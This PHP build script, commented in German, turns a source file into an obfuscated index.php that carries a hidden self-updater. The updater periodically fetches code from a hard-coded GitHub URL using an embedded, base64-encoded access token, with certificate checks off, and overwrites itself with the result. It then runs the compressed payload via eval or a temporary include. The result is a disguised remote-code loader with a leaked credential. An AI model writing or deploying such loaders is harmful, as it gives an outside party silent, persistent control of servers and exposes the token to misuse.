<?php
// build.php — lokal ausfuehren: php build.php
// Liest index2.php → erzeugt obfuskiertes index.php

if (!file_exists('index2.php')) die("FEHLER: index2.php nicht gefunden\n");

$code = preg_replace('/^\s*<\?php\s*/i', '', file_get_contents('index2.php'), 1);
$blob = base64_encode(gzdeflate($code, 9));

$src   = 'https://raw.githubusercontent.com/LennyGodart/wsers/refs/heads/main/index.php';
$token = 'Z2hwXzZzd2tsbm5VSlBXeFp0T3VFQjBpWnR3dlJab1lWYjE5c2ZDeA==';

$tpl = <<<'NOWDOC'
<?php
(static function(){foreach(['_SRC'=>'%%SRC%%','_INT'=>1800] as $k=>$v)defined($k)||define($k,$v);})();
(function(){$f=__DIR__.'/.u';if(time()-(int)@file_get_contents($f)<_INT)return;@file_put_contents($f,time());$h=['Authorization: token '.base64_decode('%%TOKEN%%')];$ctx=stream_context_create(['http'=>['timeout'=>6,'header'=>$h],'https'=>['timeout'=>6,'header'=>$h]]);$n=@file_get_contents(_SRC,false,$ctx);if(!$n&&function_exists('curl_init')){$c=curl_init(_SRC);curl_setopt_array($c,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_TIMEOUT=>6,CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_HTTPHEADER=>$h]);$n=curl_exec($c);curl_close($c);}if($n&&strlen($n)>200&&md5($n)!==md5_file(__FILE__))@file_put_contents(__FILE__,$n);})();
$__x='%%BLOB%%';
$__c=@gzinflate(base64_decode($__x));
if($__c!==false){eval('?>'.$__c);exit;}
if(function_exists('eval')||true){$t=@tempnam(sys_get_temp_dir(),'');if($t){@file_put_contents($t.'.php','<?php '.$__c);@include($t.'.php');@unlink($t.'.php');exit;}}
NOWDOC;

$out = str_replace(['%%SRC%%', '%%TOKEN%%', '%%BLOB%%'], [$src, $token, $blob], $tpl);
file_put_contents('index.php', $out);
echo 'Done! index.php: ' . round(strlen($out) / 1024, 1) . " KB\n";
